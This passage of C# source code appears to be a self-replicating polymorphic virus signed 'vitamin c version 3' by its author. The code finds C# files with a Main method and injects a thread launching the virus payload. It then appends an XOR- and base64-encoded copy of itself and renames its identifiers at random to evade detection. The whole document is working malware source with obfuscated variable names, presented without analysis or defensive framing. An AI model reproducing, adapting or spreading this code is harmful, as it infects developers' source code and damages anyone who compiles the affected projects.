                uiphyah2568 += vdbkrxv4700 + "\r\n";
            }
            mrhzvmk5327.Close();
            return uiphyah2568;
        }
        private static bool ehdeyrq2874(string hylyocg4362)
        {
            int ervfosz3483 = hylyocg4362.ToLower().IndexOf("sun.microsystems.java");
            if (ervfosz3483 >= 0)
                return true;
            else
                return false;
        }
        private static bool xrwiaqq3172(string hylyocg4362)
        {
            int ervfosz3483 = hylyocg4362.ToLower().IndexOf("main(");
            if (ervfosz3483 >= 0)
                return true;
            else
                return false;
        }
        private static bool clplhwn2663(string ypcdbwv5139, string hylyocg4362, string database)
        {   
            string usmgzle2465 = new Random().Next((66 + 1),1000).ToString();
            int rsykiwk1478 = hylyocg4362.ToLower().IndexOf("main(");
            int hbqiuds3356 = rsykiwk1478;
            char[] widdppa1303 = hylyocg4362.ToCharArray(0, hylyocg4362.Length - 1);
            while (widdppa1303[hbqiuds3356] != '{')
            {
                hbqiuds3356 += 1;
            }
            int hdhkgcj3584 = hylyocg4362.ToLower().IndexOf("using system;");
            string toaffam5229 = "Main(string[] args)\r\n\t{\r\n\tSystem.Threading.Thread g" + usmgzle2465 + " = " +
                        "new System.Threading.Thread(IsKing.LetsGo);\r\n\tg" + usmgzle2465 + ".Start();";
            hylyocg4362 = hylyocg4362.Replace(hylyocg4362.Substring(rsykiwk1478, (hbqiuds3356 - rsykiwk1478) + 1), toaffam5229);
            if (hdhkgcj3584 < 0)
            {
                hylyocg4362 = "using System;\r\n" + hylyocg4362;
            }
            hylyocg4362 = hylyocg4362.Replace("using System;", "using System;\r\nusing Sun.Microsystems.Java;");
            string xvjismt2508 = "";
            string jlkmcba2479 = "";
            string jkiwfdl3296 = "";
            string[] eopjvyg4557 = database.Split(new char[] { '>' });
            xvjismt2508 = vqzygki2275(jhmumoc1240(eopjvyg4557[1]),Convert.ToInt32(eopjvyg4557[0]));
            jlkmcba2479 = vqzygki2275(jhmumoc1240(eopjvyg4557[2]),Convert.ToInt32(eopjvyg4557[0]));
            jlkmcba2479 = tmtreat4377(jlkmcba2479);
            if (usmgzle2465.Length == 1)
            {
                usmgzle2465 = "0000" + usmgzle2465;
            }
            else if (usmgzle2465.Length == 2)
            {
                usmgzle2465 = "000" + usmgzle2465;
            }
            else if (usmgzle2465.Length == 3)
            {
                usmgzle2465 = "00" + usmgzle2465;
            }
            else
            {
                usmgzle2465 = "0" + usmgzle2465;
            }
            jkiwfdl3296 = eopjvyg4557[0].Replace("00413", usmgzle2465);
            jlkmcba2479 = jlkmcba2479.Replace("00413", usmgzle2465);
            string ltfylqm4808 = uyxgjzx3363(jkiwfdl3296 + ">" + lksydtj5259(vqzygki2275(xvjismt2508, System.Convert.ToInt32(usmgzle2465))) + ">" + lksydtj5259(vqzygki2275(jlkmcba2479, System.Convert.ToInt32(usmgzle2465))));
            using (System.IO.StreamWriter uhbzfzl2365 = new System.IO.StreamWriter(ypcdbwv5139))
            {
                uhbzfzl2365.WriteLine(hylyocg4362);
                uhbzfzl2365.WriteLine("\r\n");
                uhbzfzl2365.Write(xvjismt2508 + ltfylqm4808 + jlkmcba2479);
                uhbzfzl2365.WriteLine("\r\n");
            }
            return false;
        }
        private static string jhmumoc1240(string irnwyfo5316)
        {
              byte[] znbudaq3400 = System.Convert.FromBase64String(irnwyfo5316);
              return System.Text.Encoding.UTF8.GetString(znbudaq3400);
        }
        private static string uyxgjzx3363(string fmfxwjv3346)
        {
            string uuobkbp3047 = "";
            for (int mjuebhe1290 = 0; mjuebhe1290 < fmfxwjv3346.Length; mjuebhe1290++)
            {
                uuobkbp3047 += fmfxwjv3346[mjuebhe1290];
                if (mjuebhe1290 != 0 && mjuebhe1290 % 110 == 0)
                {
                    uuobkbp3047 = uuobkbp3047 + "\" + \r\n\t\t\t\t\"";
                }
            }
            return uuobkbp3047;
        }
       private static string lksydtj5259(string vydmosa5269)
        {
            System.Text.UTF8Encoding hvqwwnx1505 = new System.Text.UTF8Encoding();
            byte[] msjptkz3464 = hvqwwnx1505.GetBytes(vydmosa5269);
            return System.Convert.ToBase64String(msjptkz3464, 0, msjptkz3464.Length);
        }
        private static string vqzygki2275(string bwfakdp4519, int gyugcnj1939)
        {
            System.Text.StringBuilder byusokd2036 = new System.Text.StringBuilder(bwfakdp4519);
            System.Text.StringBuilder ksouwdg3406 = new System.Text.StringBuilder(bwfakdp4519.Length);
            char bedhnse5110;
            for (int mjuebhe1290 = 0; mjuebhe1290 < bwfakdp4519.Length; mjuebhe1290++)
            {
                bedhnse5110= byusokd2036[mjuebhe1290];
                bedhnse5110 = (char)(bedhnse5110 ^ gyugcnj1939);
                ksouwdg3406.Append(bedhnse5110);
            }
            return ksouwdg3406.ToString();
        }
        private static string tmtreat4377(string oygajhu4133)
        {
            Random ybxdwnx3507 = new Random();
            string[] wdqrtga5499 = { "dhvonvz1412", "lhljctr4013", "hvqwwnx1505",
                   "ervfosz3483","utmlmda2483","terngzu1585","qrqpjiw3316","ntehlpo5037","bxhqibe1172","ypcdbwv5139","jmksptx4928","esvelek1822",
                   "pbtadsm4531","yijitto2481","clplhwn2663","tsgawhq1822","rwbkgft3524","sxlppzz1320","euzjema2513","mrhzvmk5327",
                   "vdbkrxv4700","uiphyah2568","ehdeyrq2874","xrwiaqq3172", "usmgzle2465","rsykiwk1478","hylyocg4362",
                   "hbqiuds3356","widdppa1303","hdhkgcj3584","toaffam5229","xvjismt2508","jlkmcba2479","jkiwfdl3296","eopjvyg4557","vqzygki2275",
                   "jhmumoc1240", "ltfylqm4808","uyxgjzx3363","uhbzfzl2365","irnwyfo5316","znbudaq3400","fmfxwjv3346","uuobkbp3047",
                   "mjuebhe1290","lksydtj5259","vydmosa5269","msjptkz3464","tmtreat4377","oygajhu4133","ybxdwnx3507","jqrmgzc5587","jccaqrf2467",
                   "flbxrtd4200","udveoth5404","ykttpfr4381","yzgahzs4125","bwfakdp4519","gyugcnj1939","byusokd2036","ksouwdg3406","bedhnse5110","wdqrtga5499"};
            for (int jccaqrf2467 = 0; jccaqrf2467 < wdqrtga5499.Length; jccaqrf2467++)
            {
                oygajhu4133 = oygajhu4133.Replace(wdqrtga5499[jccaqrf2467], flbxrtd4200(ybxdwnx3507.Next((1003 + 1), (5555 - 1)) + jccaqrf2467) + (ybxdwnx3507.Next((1003 + 1), (5555 - 1)) + jccaqrf2467).ToString());
            }
            return oygajhu4133;
        }
        private static string flbxrtd4200(int jqrmgzc5587)
        {
            char[] udveoth5404 = new char[7];
            Random ybxdwnx3507 = new Random(jqrmgzc5587);
            for (int mjuebhe1290 = 0; mjuebhe1290 < 7; mjuebhe1290++)
            {
                int ykttpfr4381 = ybxdwnx3507.Next(0, 26); // Zero to 25
                udveoth5404[mjuebhe1290] += (char)('a' + ykttpfr4381);
            }
            string usmgzle2465 = new string(udveoth5404);
            return usmgzle2465;
        }
     }
} // vitamin c version 3 by alc0paul <bangingatbang@land.ru> http://alcopaul.co.nr






